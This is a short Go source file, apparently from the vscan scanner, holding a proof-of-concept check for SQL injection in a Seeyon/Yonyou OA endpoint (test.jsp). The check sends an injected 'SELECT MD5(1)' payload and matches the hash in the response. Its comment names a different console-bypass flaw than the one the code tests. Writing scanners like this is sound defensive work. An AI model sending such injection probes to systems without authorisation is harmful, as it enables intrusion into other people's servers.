package seeyon

import (
	"fmt"
	"github.com/veo/vscan/pkg"
	"strings"
)
//用友 uapws/index.jsp 控制台绕过漏洞


func TestSql(u string) bool {
	if req, err := pkg.HttpRequset(u+"/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20MD5(1))", "GET", "", false, nil); err == nil {
		if req.StatusCode == 200 && strings.Contains(req.Body, "c4ca4238a0b923820dcc509a6f75849b"){
			pkg.GoPocLog(fmt.Sprintf("Found vuln yonyou test sql|%s\n", u+"/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20MD5(1))"))
			return true
		}
	}
	return false
}